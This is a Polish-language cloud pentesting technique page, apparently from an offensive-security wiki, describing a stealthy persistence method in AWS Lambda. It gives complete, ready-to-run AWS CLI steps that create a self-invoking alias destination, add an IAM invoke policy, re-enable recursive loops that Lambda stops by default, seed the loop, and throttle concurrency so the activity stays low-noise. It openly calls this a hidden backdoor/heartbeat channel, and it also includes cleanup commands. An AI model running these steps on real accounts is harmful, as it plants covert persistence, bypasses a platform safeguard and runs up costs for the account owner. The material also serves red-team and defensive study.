# AWS - Lambda Async Self-Loop Persistence via Destinations + Recursion Allow

Wykorzystaj asynchroniczne Destinations w Lambda razem z konfiguracją Recursion, aby sprawić, że funkcja będzie nieustannie samowywoływać się bez zewnętrznego harmonogramu (bez EventBridge, cron itp.). Domyślnie Lambda przerywa pętle rekurencyjne, ale ustawienie Recursion na Allow ponownie je włącza. Destinations realizują dostarczenie po stronie serwisu dla asynchronicznych wywołań, więc jedno inicjalne wywołanie tworzy ukryty, bezkodowy kanał heartbeat/backdoor. Opcjonalnie ograniczaj ruch za pomocą reserved concurrency, aby utrzymać niski poziom hałasu.

Uwagi
- Lambda nie pozwala bezpośrednio skonfigurować funkcji jako jej własnego destination. Użyj aliasu funkcji jako destination i nadaj execution role uprawnienie do wywoływania tego aliasu.
- Minimalne uprawnienia: możliwość odczytu/aktualizacji event invoke config i recursion config docelowej funkcji, publikowania wersji i zarządzania aliasem oraz aktualizacji polityki execution role funkcji, aby zezwolić na lambda:InvokeFunction dla aliasu.

## Wymagania
- Region: us-east-1
- Zmienne:
- REGION=us-east-1
- TARGET_FN=<target-lambda-name>

## Kroki

1) Pobierz ARN funkcji i bieżące ustawienie Recursion
```
FN_ARN=$(aws lambda get-function --function-name "$TARGET_FN" --region $REGION --query Configuration.FunctionArn --output text)
aws lambda get-function-recursion-config --function-name "$TARGET_FN" --region $REGION || true
```
2) Opublikuj wersję i utwórz/zaktualizuj alias (używany jako self destination)
```
VER=$(aws lambda publish-version --function-name "$TARGET_FN" --region $REGION --query Version --output text)
if ! aws lambda get-alias --function-name "$TARGET_FN" --name loop --region $REGION >/dev/null 2>&1; then
aws lambda create-alias --function-name "$TARGET_FN" --name loop --function-version "$VER" --region $REGION
else
aws lambda update-alias --function-name "$TARGET_FN" --name loop --function-version "$VER" --region $REGION
fi
ALIAS_ARN=$(aws lambda get-alias --function-name "$TARGET_FN" --name loop --region $REGION --query AliasArn --output text)
```
3) Zezwól roli wykonawczej funkcji na wywołanie aliasu (wymagane przez Lambda Destinations→Lambda)
```
# Set this to the execution role name used by the target function
ROLE_NAME=<lambda-execution-role-name>
cat > /tmp/invoke-self-policy.json <<EOF
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "lambda:InvokeFunction",
"Resource": "${ALIAS_ARN}"
}
]
}
EOF
aws iam put-role-policy --role-name "$ROLE_NAME" --policy-name allow-invoke-self --policy-document file:///tmp/invoke-self-policy.json --region $REGION
```
4) Skonfiguruj async destination do aliasu (self via alias) i wyłącz retries
```
aws lambda put-function-event-invoke-config \
--function-name "$TARGET_FN" \
--destination-config OnSuccess={Destination=$ALIAS_ARN} \
--maximum-retry-attempts 0 \
--region $REGION

# Verify
aws lambda get-function-event-invoke-config --function-name "$TARGET_FN" --region $REGION --query DestinationConfig
```
5) Pozwól na rekurencyjne pętle
```
aws lambda put-function-recursion-config --function-name "$TARGET_FN" --recursive-loop Allow --region $REGION
aws lambda get-function-recursion-config --function-name "$TARGET_FN" --region $REGION
```
6) Zainicjuj jedno asynchroniczne wywołanie
```
aws lambda invoke --function-name "$TARGET_FN" --invocation-type Event /tmp/seed.json --region $REGION >/dev/null
```
7) Obserwuj ciągłe wywołania (przykłady)
```
# Recent logs (if the function logs each run)
aws logs filter-log-events --log-group-name "/aws/lambda/$TARGET_FN" --limit 20 --region $REGION --query events[].timestamp --output text
# or check CloudWatch Metrics for Invocations increasing
```
8) Opcjonalne ukryte ograniczenie tempa
```
aws lambda put-function-concurrency --function-name "$TARGET_FN" --reserved-concurrent-executions 1 --region $REGION
```
## Czyszczenie
Przerwij pętlę i usuń persistence.
```
aws lambda put-function-recursion-config --function-name "$TARGET_FN" --recursive-loop Terminate --region $REGION
aws lambda delete-function-event-invoke-config --function-name "$TARGET_FN" --region $REGION || true
aws lambda delete-function-concurrency --function-name "$TARGET_FN" --region $REGION || true
# Optional: delete alias and remove the inline policy when finished
aws lambda delete-alias --function-name "$TARGET_FN" --name loop --region $REGION || true
ROLE_NAME=<lambda-execution-role-name>
aws iam delete-role-policy --role-name "$ROLE_NAME" --policy-name allow-invoke-self --region $REGION || true
```
## Impact
- Jedno async invoke powoduje, że Lambda ciągle wywołuje się ponownie bez zewnętrznego harmonogramu, umożliwiając stealthy persistence/heartbeat. Reserved concurrency może ograniczyć hałas do jednej warm execution.
